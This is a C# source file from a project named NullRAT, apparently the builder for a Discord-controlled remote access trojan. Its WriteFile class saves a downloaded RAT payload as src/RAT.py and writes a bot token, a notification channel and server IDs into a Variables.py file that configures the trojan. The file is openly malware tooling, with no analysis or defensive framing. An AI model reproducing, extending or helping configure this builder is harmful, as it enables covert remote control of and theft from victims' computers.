﻿namespace NullRAT.Compiler
{
    internal class WriteFile
    {
        /// <summary>
        /// Reads RequestResponse of the RAT download request. Then using DataAsString converted to Bytes[] it overwrites the RAT
        /// </summary>
        /// <param name="updResp">The RequestResponse of the RAT Download</param>
        public static async Task WriteRAT(RequestResponse updResp)
        {
            AnsiConsole.Markup("");
            byte[] ratData = Encoding.UTF8.GetBytes(updResp.DataAsString.ToString());
            using FileStream ratFile = File.Create(Environment.CurrentDirectory + "/src/RAT.py");

            await ratFile.WriteAsync(ratData, 0, ratData.Length, new CancellationToken());
        }
        public static void WriteVariables(RATVariables ratVars)
        {
            //Path to Variables.py
            StreamWriter writer = File.CreateText(Environment.CurrentDirectory + "/src/Variables.py");

            // Write them ACCORDINGLY.
            // Examples:
            // variables[1] = Notif Channel ID
            // varNames[1] = Notif Channel ID Variable name
            // NOTE: Servers IDs are not included.
            List<string> variables = new() 
            { 
                ratVars.Bot_Token.ToString(), 
                ratVars.Notification_Channel_ID.ToString() 
            };
            List<string> varNames = new()
            {
                "bot_token",
                "notification_channel",
                "server_ids"
            };

            //Write Bot Token and Notification channel at once
            writer.WriteLine($"# This file was auto-generated by NullRAT Compiler. DO NOT SHARE!");
            writer.WriteLine($"{varNames[0]} = \"{variables[0]}\"");
            writer.WriteLine($"{varNames[1]} = {variables[1]}");
            
            //Write first part of ServerIDs
            writer.Write($"{varNames[2]} = [");
            
            //Iterate through the amount of server ids, until it finds the end thanks to the exception, write the last line and mark the ending with a ]
            for (int i = 0; i < ratVars.Server_IDs.Count; i++)
            {
                try
                {
                    if (ratVars.Server_IDs[i + 1] != null)
                    {
                        writer.Write(ratVars.Server_IDs[i] + ", ");
                    }
                }
                catch
                {
                    writer.Write(ratVars.Server_IDs[i] + "]");
                }
            }
            //Flush buffer, dispose writer and close.
            writer.Flush();
            writer.Dispose();
            writer.Close();
        }
    }
}